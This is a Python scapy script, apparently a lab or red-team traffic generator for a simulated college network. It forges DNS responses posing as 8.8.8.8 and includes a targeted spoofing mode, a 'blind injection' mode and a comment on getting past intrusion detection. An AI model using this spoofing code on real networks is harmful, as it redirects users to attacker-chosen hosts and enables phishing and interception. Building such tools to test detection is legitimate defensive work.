from scapy.all import send, IP, UDP, DNS, DNSQR, DNSRR, conf
import random
import time
import sys
import network_utils

def get_input(prompt, default=None):
    if default:
        val = input(f"{prompt} [{default}]: ").strip()
        return val if val else default
    else:
        return input(f"{prompt}: ").strip()

# Helper to generate random student IPs
def random_student_ip():
    return f"10.0.0.{random.randint(2, 254)}"

def send_dns_query(iface, student_ip, domain, tx_id):
    """Simulate a Student asking for a website"""
    pkt = (
        IP(src=student_ip, dst="8.8.8.8") /
        UDP(sport=random.randint(1024, 65535), dport=53) /
        DNS(
            id=tx_id,
            qr=0, # Query
            qd=DNSQR(qname=domain)
        )
    )
    send(pkt, iface=iface, verbose=0)

def send_dns_response(iface, student_ip, domain, spoofed_ip, ttl=60, tx_id=None):
    """Simulate the Response coming back to the student"""
    if tx_id is None:
        tx_id = random.randint(1, 65535)

    pkt = (
        IP(src="8.8.8.8", dst=student_ip) / # Destined for the student
        UDP(dport=random.randint(1024, 65535), sport=53) /
        DNS(
            id=tx_id,
            qr=1, # Response
            qd=DNSQR(qname=domain),
            an=DNSRR(rrname=domain, ttl=ttl, rdata=spoofed_ip)
        )
    )
    send(pkt, iface=iface, verbose=0)
    print(f"[SENT] To {student_ip}: {domain} -> {spoofed_ip} (ID: {tx_id})")

def main():
    print("\n" + "="*50)
    print("DNS RED TEAM - COLLEGE SIMULATION MODE")
    print("="*50 + "\n")

    try:
        iface_name, iface_ip = network_utils.select_interface_interactive()
        
        while True:
            print("\nSelect Attack Vector:")
            print("1. Target Specific Student (Spoofing)")
            print("2. College Traffic Simulation (Multiple Users)")
            print("3. Blind Injection on Random Student")
            print("4. Exit")
            
            choice = input("Choice: ")
            
            if choice == '1':
                victim = get_input("Victim IP", "10.0.0.50")
                domain = "google.com"
                fake_ip = "6.6.6.6"
                
                # 1. Send legitimate query (so NIDS doesn't flag 'Unsolicited')
                tx_id = random.randint(1000,9000)
                send_dns_query(iface_name, victim, domain, tx_id)
                time.sleep(0.1) 
                
                # 2. Send SPOOFED response matching that ID
                send_dns_response(iface_name, victim, domain, fake_ip, tx_id=tx_id)
            
            elif choice == '2':
                count = int(get_input("Number of Students", "10"))
                print(f"[*] Simulating {count} students browsing...")
                for _ in range(count):
                    student = random_student_ip()
                    tx_id = random.randint(1000,9000)
                    
                    # Student asks...
                    send_dns_query(iface_name, student, "google.com", tx_id)
                    time.sleep(0.05)
                    
                    # Server answers (Legitimate)
                    send_dns_response(iface_name, student, "google.com", "142.250.192.14", tx_id=tx_id)
            
            elif choice == '3':
                # Attack a random student without them asking
                victim = random_student_ip()
                print(f"[*] Attacking {victim} with Blind Injection...")
                send_dns_response(iface_name, victim, "facebook.com", "1.2.3.4")

            elif choice == '4':
                sys.exit(0)

    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    main()